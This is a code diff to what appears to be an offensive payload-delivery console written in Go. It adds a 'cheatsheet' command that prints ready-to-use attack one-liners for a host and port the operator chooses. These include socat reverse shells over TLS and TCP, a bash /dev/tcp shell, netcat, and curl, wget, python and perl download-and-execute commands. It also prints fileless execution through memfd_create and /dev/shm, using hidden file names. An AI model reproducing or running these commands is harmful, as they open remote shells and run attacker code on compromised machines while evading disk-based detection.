@@ -54,6 +54,8 @@ func (c *Console) Run() {
 			c.handlePayload(args[1:])
 		case "generate":
 			c.handleGenerate(args[1:])
+		case "cheatsheet":
+			c.handleCheatsheet(args[1:])
 		case "loaders":
 			c.handleLoaders()
 		case "tokens":
@@ -355,6 +357,155 @@ func (c *Console) handleCallbacks() {
 	fmt.Println()
 }
 
+func (c *Console) handleCheatsheet(args []string) {
+	host := ""
+	port := ""
+	for i := 0; i < len(args); i++ {
+		switch args[i] {
+		case "--host":
+			if i+1 < len(args) {
+				host = args[i+1]
+				i++
+			}
+		case "--port":
+			if i+1 < len(args) {
+				port = args[i+1]
+				i++
+			}
+		}
+	}
+
+	if host == "" || port == "" {
+		fmt.Printf("%s[!] Usage: cheatsheet --host <IP> --port <PORT>%s\n", Red, Reset)
+		return
+	}
+
+	type technique struct {
+		name    string
+		requires string
+		note    string
+		cmd     string
+	}
+
+	type category struct {
+		title      string
+		techniques []technique
+	}
+
+	categories := []category{
+		{
+			title: "Socat (TLS)",
+			techniques: []technique{
+				{
+					name:     "socat-tls",
+					requires: "socat",
+					note:     "reverse shell over TLS",
+					cmd:      fmt.Sprintf("socat OPENSSL:%s:%s,verify=0 EXEC:/bin/bash", host, port),
+				},
+				{
+					name:     "socat-memfd",
+					requires: "socat, python3",
+					note:     "fileless exec over TLS — serve payload at <URL>",
+					cmd:      fmt.Sprintf(`curl -sk https://%s:%s/<URL> | python3 -c "import ctypes,os,sys;b=sys.stdin.buffer.read();l=ctypes.CDLL(None);fd=l.syscall(319,'',1);os.write(fd,b);os.execl('/proc/self/fd/'+str(fd),'x')"`, host, port),
+				},
+				{
+					name:     "socat-pty",
+					requires: "socat",
+					note:     "reverse shell with PTY over TLS",
+					cmd:      fmt.Sprintf("socat OPENSSL:%s:%s,verify=0 EXEC:/bin/bash,pty,stderr,setsid", host, port),
+				},
+			},
+		},
+		{
+			title: "Socat (TCP)",
+			techniques: []technique{
+				{
+					name:     "socat-tcp",
+					requires: "socat",
+					note:     "reverse shell over raw TCP",
+					cmd:      fmt.Sprintf("socat TCP:%s:%s EXEC:/bin/bash", host, port),
+				},
+			},
+		},
+		{
+			title: "HTTP/HTTPS",
+			techniques: []technique{
+				{
+					name:     "curl",
+					requires: "curl",
+					note:     "download + exec — serve payload at <URL>",
+					cmd:      fmt.Sprintf("f=$(mktemp);curl -sk https://%s:%s/<URL> -o $f;chmod +x $f;$f;rm -f $f", host, port),
+				},
+				{
+					name:     "wget",
+					requires: "wget",
+					note:     "download + exec — serve payload at <URL>",
+					cmd:      fmt.Sprintf("f=$(mktemp);wget --no-check-certificate -qO $f https://%s:%s/<URL>;chmod +x $f;$f;rm -f $f", host, port),
+				},
+				{
+					name:     "python",
+					requires: "python3",
+					note:     "download + exec via urllib — serve payload at <URL>",
+					cmd:      fmt.Sprintf(`python3 -c "import urllib.request,os,tempfile;f=tempfile.mktemp();urllib.request.urlretrieve('https://%s:%s/<URL>',f);os.chmod(f,0o755);os.execl(f,'x')"`, host, port),
+				},
+				{
+					name:     "perl",
+					requires: "perl, IO::Socket::SSL",
+					note:     "download + exec via SSL socket — serve payload at <URL>",
+					cmd:      fmt.Sprintf(`perl -e 'use IO::Socket::SSL;my $s=IO::Socket::SSL->new(PeerAddr=>"%s:%s",SSL_verify_mode=>0);print $s "GET /<URL> HTTP/1.0\r\nHost: %s\r\n\r\n";my $b;1 while <$s>!~/^\r$/;{local $/;$b=<$s>}open F,">/tmp/.x";print F $b;close F;chmod 0755,"/tmp/.x";exec"/tmp/.x"'`, host, port, host),
+				},
+			},
+		},
+		{
+			title: "Raw TCP",
+			techniques: []technique{
+				{
+					name:     "bash-devtcp",
+					requires: "bash",
+					note:     "classic reverse shell via /dev/tcp",
+					cmd:      fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", host, port),
+				},
+				{
+					name:     "netcat",
+					requires: "nc",
+					note:     "receive + exec over raw TCP",
+					cmd:      fmt.Sprintf("f=$(mktemp);nc %s %s > $f;chmod +x $f;$f;rm -f $f", host, port),
+				},
+			},
+		},
+		{
+			title: "Fileless",
+			techniques: []technique{
+				{
+					name:     "memfd",
+					requires: "curl, python3",
+					note:     "fileless exec via memfd_create — serve payload at <URL>",
+					cmd:      fmt.Sprintf(`curl -sk https://%s:%s/<URL> | python3 -c "import ctypes,os,sys;b=sys.stdin.buffer.read();l=ctypes.CDLL(None);fd=l.syscall(319,'',1);os.write(fd,b);os.execl('/proc/self/fd/'+str(fd),'x')"`, host, port),
+				},
+				{
+					name:     "devshm",
+					requires: "curl",
+					note:     "exec from /dev/shm (tmpfs, no disk) — serve payload at <URL>",
+					cmd:      fmt.Sprintf("curl -sk https://%s:%s/<URL> -o /dev/shm/.x;chmod +x /dev/shm/.x;/dev/shm/.x;rm -f /dev/shm/.x", host, port),
+				},
+			},
+		},
+	}
+
+	fmt.Println()
+	for _, cat := range categories {
+		fmt.Printf("%s%s── %s %s%s\n", Bold, Teal, cat.title, strings.Repeat("─", 52-len(cat.title)), Reset)
+		for _, t := range cat.techniques {
+			fmt.Printf("\n  %s%s%-18s%s %s[requires: %s]%s", Bold, Blue, t.name, Reset, Subtext, t.requires, Reset)
+			if t.note != "" {
+				fmt.Printf("  %s(%s)%s", Surface, t.note, Reset)
+			}
+			fmt.Printf("\n  %s%s%s\n", Text, t.cmd, Reset)
+		}
+		fmt.Println()
+	}
+}
+
 func (c *Console) handleHelp() {
 	fmt.Printf(`
 %s%sPayload Management%s
@@ -374,6 +525,7 @@ func (c *Console) handleHelp() {
   %stokens%s                               List active tokens
   %stoken revoke%s <value>                 Revoke a token
   %scallbacks%s                            Show delivery log
+  %scheatsheet%s --host IP --port PORT     Delivery technique reference
 
 %s%sControl%s
   %sexit%s                                 Shutdown + zero all payloads
@@ -384,7 +536,7 @@ func (c *Console) handleHelp() {
 		Bold, Teal, Reset,
 		Blue, Reset, Blue, Reset,
 		Bold, Teal, Reset,
-		Blue, Reset, Blue, Reset, Blue, Reset, Blue, Reset,
+		Blue, Reset, Blue, Reset, Blue, Reset, Blue, Reset, Blue, Reset,
 		Bold, Teal, Reset,
 		Blue, Reset)
 }
